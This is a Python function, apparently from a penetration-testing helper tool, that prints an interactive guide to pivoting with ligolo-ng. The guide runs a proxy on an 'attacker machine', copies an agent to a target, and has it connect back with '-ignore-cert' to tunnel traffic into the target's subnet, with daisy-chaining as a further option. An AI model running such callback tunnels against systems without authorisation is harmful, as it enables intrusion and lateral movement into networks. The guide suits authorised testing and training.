
from core.config import bcolors


def ligolo_guide_steps():
    print(f"\n{bcolors.OKCYAN}[1] Go to ligolo-ng releases page (https://github.com/nicocha30/ligolo-ng/releases/) and download:\n"
          f"        a)The {bcolors.BOLD}proxy{bcolors.RESET}{bcolors.OKCYAN} compressed file corresponding to your {bcolors.BOLD}atacker machine{bcolors.RESET}{bcolors.OKCYAN} architecture (i.e linux_amd64)\n"
          f"        a)The {bcolors.BOLD}agent{bcolors.RESET}{bcolors.OKCYAN} compressed file corresponding to the {bcolors.BOLD}target machine{bcolors.RESET}{bcolors.OKCYAN} architecture (i.e windows_amd64)\n")
    print(f"[*] Extract both files.\n"
          f"{bcolors.YELLOW}    The {bcolors.BOLD}proxy{bcolors.RESET}{bcolors.YELLOW} executable acts as a \"server\" that manages different connections\n"
          f"    The {bcolors.BOLD}agent{bcolors.RESET}{bcolors.YELLOW} will run on the target machine and server as the endpoint for the tunnel")

    input(f"{bcolors.OKCYAN}\n\nPress enter to continue...\n")

    print(f"\n[2] Set up the proxy. You should take some things into account:\n"
       f"{bcolors.YELLOW}       a) The default proxy listener (the port that will wait for incoming connections) is 11601. You will need it when connecting an agent back to your machine. It can be changed\n"
       f"       b) The proxy, unlike the agent, needs to be ran as superuser.\n"
       f"       c) If you plan on using burpsuite or any other program that uses a proxy or listener on port 8080, it will clash with ligolo-ng web UI.\n"
       f"{bcolors.OKCYAN}           To fix this, open {bcolors.BOLD}ligolo-ng.yaml{bcolors.RESET}{bcolors.OKCYAN} on the same folder the proxy executable is in and change,\n"
       f"           inside the web block any mention of port 8080 (on the {bcolors.BOLD}listen and corsallowedorigin{bcolors.RESET}{bcolors.OKCYAN} clauses, mainly)\n"
       f"           to another port of your choosing. You will have to use that port if you want to use the web UI.\n"
       f"{bcolors.YELLOW}       d)Ligolo-ng uses a signed certificate both to validate the web UI and agents to mitigate possible man in the middle attacks that spoof connections.\n"
f"                 In this case, a self certificate will be used and the agents will be forced to ignore the validity of the certificate for ease of use. On an actual real-life scenario this is not advisable.")

    print(f"\n{bcolors.OKCYAN}Now, run the following command:\n"
          f"{bcolors.BOLD}sudo proxy -selfcert{bcolors.RESET}{bcolors.YELLOW}\n"
          f"This will run the proxy manager as superuser, and will create a selfcert for botht he UI and the incoming connections")

    input(f"{bcolors.OKCYAN}\n\nPress enter to continue...\n")

    print(f"\n{bcolors.OKCYAN}[3] Send the agent executable to the target machine. (Check transfer tools for tips)\n"
        f"Once there, make it executable via \n{bcolors.BOLD}chmod +x ./agent{bcolors.RESET}{bcolors.OKCYAN}")

    input(f"{bcolors.OKCYAN}\n\nPress enter to continue...\n")

    print(f"\n{bcolors.OKCYAN}[4] Run the following command on the target machine:\n"
          f"{bcolors.BOLD} agent -connect [IP]:[LISTENER] -ignore-cert{bcolors.RESET}{bcolors.YELLOW}\n"
          f"Where IP is the ip of your attacker machine visible from the target\n"
          f"LISTENER is the port the proxy uses to listen to connections (default being 11601)\n"
          f"and -ignore-cert ignores the self-signed certificate")

    input(f"{bcolors.OKCYAN}\n\nPress enter to continue...\n")

    print(f"\n{bcolors.OKCYAN}[5] You should see the proxy recieving and accepting the agent connection. \n"
          f"First you need to choose the \"session\" the added agent is in. In the proxy terminal, type:\n {bcolors.BOLD}session{bcolors.RESET}{bcolors.OKCYAN}\nand choose via arrows or typing the session number the agent added.")

    input(f"{bcolors.OKCYAN}\n\nPress enter to continue...\n")


    print(
        f"\n{bcolors.OKCYAN}[6] Now you got to create a tunnel and a route so that the traffic can be correctly sent through to the endpoint..\n"
        f"Type:\n {bcolors.BOLD}autoroute{bcolors.RESET}{bcolors.OKCYAN}\nOn the proxy terminal\n"
        f"{bcolors.YELLOW}It will ask you the route to add to the connection. {bcolors.UNDERLINE}It must be the route that has the subnet shared by your target and attacker machine.{bcolors.RESET}{bcolors.YELLOW}\n"
        f"For example, if the visible IP of the target machine is 10.0.0.3, then you would add a route for 10.0.0.1/24 (or equivalent detected)\n\n"
        f"{bcolors.OKCYAN}After that, it will ask you if you want to use an existing interface or create a new one. Choose to create a new one. It will have a random name\n\n"
        f"After that, it will ask you if you want to enable the tunnel. Say yes")

    input(f"{bcolors.OKCYAN}\n\nPress enter to continue...\n")

    print(f"\n{bcolors.OKCYAN}[*] And that's basically it! you've set up and environment in which:\n"
          f"    - All the data directed at your target ip's subnet will be forwarded via the tunnel interface\n"
          f"    - All the data from the target to your local interface will be forwarded via the tunnel interface")

    print(f"\n{bcolors.OKCYAN}[*] This allows for bidirectional communication without the hiccups of SOCKS proxy")

    input(f"{bcolors.OKCYAN}\n\nPress enter to continue...\n")

    print(f"\n{bcolors.OKCYAN}[*] Daisychaining in this setup is also possible;\n"
          f"It involves creating extra listener ports on your attacker machine, adding a forward rule on your first agent, and the repeat the above process for the new agent and listener port.")

    input(f"\n\nPress enter to end guide...{bcolors.RESET}")
